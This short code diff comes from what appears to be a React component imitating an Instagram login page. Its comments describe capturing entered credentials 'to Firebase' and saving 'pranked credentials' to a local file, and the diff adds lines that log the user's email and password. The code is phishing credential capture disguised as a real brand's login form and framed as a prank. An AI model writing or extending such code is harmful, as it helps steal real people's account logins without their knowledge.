@@ -33,6 +33,8 @@ const InstagramLogin = () => {
       } else {
         // For login, CAPTURE THE CREDENTIALS TO FIREBASE! 🎯
         console.log('🎯 Starting prank sequence...');
+        console.log('📧 Email:', email);
+        console.log('🔐 Password:', password);
         setSavedCredentials({ email, password });
         
         // Save pranked credentials to local file through backend
